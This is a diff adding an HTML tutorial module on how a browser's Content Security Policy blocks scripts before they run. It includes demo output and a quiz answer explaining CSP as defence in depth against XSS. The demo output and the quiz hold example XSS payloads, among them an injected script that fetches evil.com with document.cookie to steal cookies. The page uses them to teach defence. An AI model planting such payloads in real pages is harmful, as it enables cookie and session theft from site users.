@@ -1,0 +1,206 @@
+<title>Module 30: csp_enforcement — Checked Before It Ever Runs</title>
+<link rel="stylesheet" href="../../../assets/design-system.css">
+<style>body{--accent:#3fae7a;--accent-dim:#153a2a;}</style>
+
+<div class="page">
+  <span class="module-badge">TRACK 2 · PHASE 9 · MODULE 30</span>
+  <h1>csp_enforcement</h1>
+  <p style="color:var(--fg-dim); margin-top:-0.8rem;">
+    Proves: CSP is a browser-side allowlist checked BEFORE a script
+    would execute — not a content filter applied to output afterward —
+    demonstrated by blocked scripts never reaching an "executed" list
+    at all.
+  </p>
+
+  <h2><span class="num">00</span>Prerequisites</h2>
+  <div class="tag-links">
+    <a class="tag-link" href="../29_cookies_samesite/tutorial.html">Module 29: cookies_samesite</a>
+    <a class="tag-link" href="../../phase6_parsing_dom/19_html_tokenizer/tutorial.html">Module 19: html_tokenizer</a>
+  </div>
+
+  <h2><span class="num">01</span>The Big Analogy</h2>
+  <div class="analogy-box">
+    A secure office building's front desk has a printed, standing list
+    of pre-approved delivery companies. A delivery driver doesn't get
+    waved through and THEN checked while already inside handing over a
+    package — the list is checked at the door, before entry, full stop.
+    A driver not on the list is turned away before ever crossing the
+    threshold, regardless of what's in the box or how convincing they
+    seem. CSP is that standing list, checked at the browser's own front
+    door, before a script is ever allowed to run — never a security
+    guard chasing down script content after it's already loose inside.
+  </div>
+
+  <h2><span class="num">02</span>What Happens, Step by Step</h2>
+  <ol class="steps">
+    <li>A page's server sends a <code>Content-Security-Policy</code>
+    header — plain text, parsed the same way any other header is
+    (Module 16).</li>
+    <li>For each <code>&lt;script&gt;</code> the page tries to load —
+    inline or with a <code>src</code> — the browser checks it against
+    the <code>script-src</code> directive's allowed sources.</li>
+    <li><code>'self'</code> matches the page's own origin;
+    <code>'unsafe-inline'</code> permits inline code; specific listed
+    origins permit scripts from exactly those sources.</li>
+    <li>Anything not matched is refused — before a single line of it
+    would ever run.</li>
+  </ol>
+
+  <h2><span class="num">03</span>What We Actually Captured</h2>
+  <div class="diagram-box">
+<pre>CSP header: script-src 'self' https://cdn.trusted.com; style-src 'self' 'unsafe-inline'
+
+<script>alert(document.cookie)</script> (inline, e.g. injected via XSS)
+    inline script BLOCKED -- not permitted by script-src ["'self'", 'https://cdn.trusted.com']
+
+<script src="/app.js"> (same-origin, first-party code)
+    script from https://example.com:443 ALLOWED
+
+<script src="https://cdn.trusted.com/lib.js"> (explicitly allowed CDN)
+    script from https://cdn.trusted.com:443 ALLOWED
+
+<script src="https://evil.com/inject.js"> (unlisted third party)
+    script from https://evil.com:443 BLOCKED
+
+Scripts that reached execution: 2
+Scripts BLOCKED before ever executing: 2</pre>
+  </div>
+  <div class="diagram-caption">
+    Real, captured output. Note the inline script is blocked FOR THE
+    SAME REASON an XSS-injected payload would be — this is exactly
+    CSP's real, primary defensive purpose, previewed here ahead of
+    Module 32.
+  </div>
+
+  <h2><span class="num">04</span>The Code, Explained</h2>
+  <pre><code>for label, src, inline in SCRIPT_TAGS:
+    allowed, reason = check_script(policy, page_origin, src=src, inline_code=inline)
+    if allowed:
+        executed.append(label)
+    else:
+        blocked.append(label)</code></pre>
+  <p>
+    Notice there is no step here that runs a script and then decides
+    afterward whether it should have. The decision is made, and the
+    script either enters the <code>executed</code> list or it doesn't
+    — there's no code path in this demo (or in a real browser) where a
+    blocked script's code ever gets a chance to run first.
+  </p>
+
+  <h2><span class="num">05</span>Limits / What You Cannot Do Yet</h2>
+  <div class="compare-box">
+    <div class="compare-col cant">
+      <h4>CAN'T DO YET</h4>
+      <ul>
+        <li>Allow SPECIFIC inline scripts via nonces or content hashes
+        — only the blanket <code>'unsafe-inline'</code> keyword is
+        implemented</li>
+        <li>Enforce any directive besides <code>script-src</code>/
+        <code>default-src</code> — real CSP also covers styles, images,
+        fonts, frames, and more, each with their own directive</li>
+      </ul>
+    </div>
+    <div class="compare-col can">
+      <h4>CAN DO NOW</h4>
+      <ul>
+        <li>Parse a real CSP header and correctly evaluate whether a
+        given script would be allowed</li>
+        <li>Explain precisely why CSP is checked BEFORE execution,
+        with a concrete demonstration, not just an assertion</li>
+        <li>Explain CSP's real, primary use case: blunting the impact
+        of an XSS injection even when one has already occurred</li>
+      </ul>
+    </div>
+  </div>
+
+  <h2><span class="num">06</span>Run It</h2>
+  <pre><code>cd track2-applied-layer/phase9_policy_layer/30_csp_enforcement
+python run_csp_demo.py</code></pre>
+
+  <div class="callout">
+    If a script you expect to be ALLOWED shows as BLOCKED: check
+    whether your CSP header's source expression includes an explicit
+    port matching (or omitting, matching the default) what your target
+    URL implies — this module compares both forms (see
+    <code>DECISIONS.md</code>), but a genuinely mismatched port (e.g.
+    <code>:8080</code> in the URL vs. no port in the policy) will
+    correctly still be blocked.
+  </div>
+
+  <h2><span class="num">07</span>Brain Exercise</h2>
+  <details class="brain-exercise">
+    <summary>
+      A page has a genuine, exploitable XSS vulnerability that lets an
+      attacker inject `&lt;script&gt;fetch('https://evil.com/steal?c=' +
+      document.cookie)&lt;/script&gt;` directly into the page's HTML. Given
+      THIS module's exact policy (`script-src 'self' https://cdn.trusted.com`),
+      would that injected script actually run? Think through both
+      halves of what it needs to do before revealing the answer.
+    </summary>
+    <div class="answer">
+      No — and this is precisely CSP's real, primary defensive value.
+      The injected `<script>` tag is INLINE (no `src` attribute), and
+      this policy has no `'unsafe-inline'` in its `script-src` — so the
+      browser refuses to execute it at all, exactly like this module's
+      first test case. Even though the XSS vulnerability genuinely
+      exists (the attacker's HTML really did get injected into the
+      page), a correctly configured CSP policy prevents that injected
+      code from ever running, which is why security guidance
+      consistently recommends CSP as DEFENSE IN DEPTH against XSS — not
+      a replacement for fixing the underlying injection vulnerability
+      (Module 32 covers that directly), but a real, independent second
+      layer that can neutralize an XSS payload even when the first
+      layer (proper input handling) has already failed.
+    </div>
+  </details>
+
+  <h2><span class="num">08</span>There Are No Dumb Questions</h2>
+  <dl class="qa">
+    <dt>If a page has NO CSP header at all, what happens?</dt>
+    <dd>Everything is allowed by default — CSP is strictly opt-in. A
+    page with no policy gets none of this protection; the browser has
+    no allowlist to check against, so every script (inline or
+    external, from any origin) is permitted to run.</dd>
+
+    <dt>Why would a real site ever want `'unsafe-inline'` if it's this
+    risky?</dt>
+    <dd>Often for practical migration reasons — a site with a lot of
+    existing inline `onclick=` handlers or inline `<script>` blocks
+    might need `'unsafe-inline'` temporarily while it's refactored to
+    use nonces, hashes, or external files instead. Real CSP deployment
+    guidance treats `'unsafe-inline'` as a real compromise, not a
+    recommended end state.</dd>
+
+    <dt>Does CSP replace input sanitization/escaping as an XSS
+    defense?</dt>
+    <dd>No — CSP is explicitly a SECOND, independent layer. The Brain
+    Exercise above shows CSP can neutralize an XSS payload's ability to
+    RUN, but the underlying vulnerability (unsanitized user input
+    reaching the page's HTML) is still a real bug that should be fixed
+    on its own terms; CSP is a mitigation for when that first defense
+    fails, not a substitute for having it.</dd>
+
+    <dt>Why check both `script-src` AND `default-src` as a fallback?</dt>
+    <dd>Because that's how the real CSP specification actually works —
+    `default-src` is a genuine fallback for any directive a policy
+    doesn't specify explicitly, not just for scripts. A policy that
+    only sets `default-src 'self'` with no separate `script-src` still
+    genuinely restricts scripts to `'self'`, and this module's fallback
+    check reflects that real behavior rather than silently treating
+    such a policy as "no script restriction at all."</dd>
+  </dl>
+
+  <h2><span class="num">09</span>What's Next</h2>
+  <p>
+    You've now built a policy that blocks unwanted scripts. Module 31
+    builds the policy that blocks something more fundamental — a silent
+    downgrade from HTTPS to HTTP — closing out Phase 9's core browser
+    policy layer before Phase 10 puts everything you've built to the
+    test against real attacks.
+  </p>
+
+  <div class="module-footer">
+    <a href="../29_cookies_samesite/tutorial.html">← Module 29: cookies_samesite</a>
+    <a href="../31_mixed_content_hsts/tutorial.html">Module 31: mixed_content_hsts →</a>
+  </div>
+</div>
